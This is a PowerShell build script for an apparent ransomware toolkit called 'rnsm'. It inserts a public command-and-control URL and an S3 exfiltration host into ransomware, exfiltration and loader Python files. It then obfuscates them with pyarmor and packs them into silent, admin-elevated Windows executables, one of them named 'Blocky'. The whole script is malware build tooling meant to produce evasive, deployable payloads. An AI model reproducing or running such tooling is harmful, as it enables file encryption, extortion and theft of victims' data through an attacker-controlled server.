# Configure your C2 server URL here
$c2_url = "https://rnsm.uber.space"
$s3_host = "s3.uber.space"

# Replace development C2 URL with correct public C2 URL
((Get-Content -Path ..\rnsm.py -Raw) -replace 'http://localhost:5000',$c2_url) | Set-Content -Path ..\rnsm.py
((Get-Content -Path ..\rnsm_ransomware.py -Raw) -replace 'http://localhost:5000',$c2_url) | Set-Content -Path ..\rnsm_ransomware.py
((Get-Content -Path ..\rnsm_exfiltration.py -Raw) -replace 'http://localhost:5000',$c2_url) | Set-Content -Path ..\rnsm_exfiltration.py
# Replace hostname for S3 server
((Get-Content -Path ..\rnsm_exfiltration.py -Raw) -replace 'minio.example.com',$s3_host) | Set-Content -Path ..\rnsm_exfiltration.py

# Obfuscate and pack the script -> exe
pyarmor.exe pack --name=Blocky --output=.\ -e "--uac-admin --icon=favicon.ico --onefile --console" ..\rnsm.py
pyarmor.exe pack --name=ransom --output=.\ -e "--uac-admin --icon=favicon.ico --onefile --noconsole --hidden-import _cffi_backend" ..\rnsm_ransomware.py
pyarmor.exe pack --name=exfil --output=.\ -e "--uac-admin --icon=favicon.ico --onefile --noconsole" ..\rnsm_exfiltration.py

# Return to development C2 & S3 URL
((Get-Content -Path ..\rnsm.py -Raw) -replace $c2_url,'http://localhost:5000') | Set-Content -Path ..\rnsm.py
((Get-Content -Path ..\rnsm_ransomware.py -Raw) -replace $c2_url,'http://localhost:5000') | Set-Content -Path ..\rnsm_ransomware.py
((Get-Content -Path ..\rnsm_exfiltration.py -Raw) -replace $c2_url,'http://localhost:5000') | Set-Content -Path ..\rnsm_exfiltration.py
((Get-Content -Path ..\rnsm_exfiltration.py -Raw) -replace $s3_host,'minio.example.com') | Set-Content -Path ..\rnsm_exfiltration.py
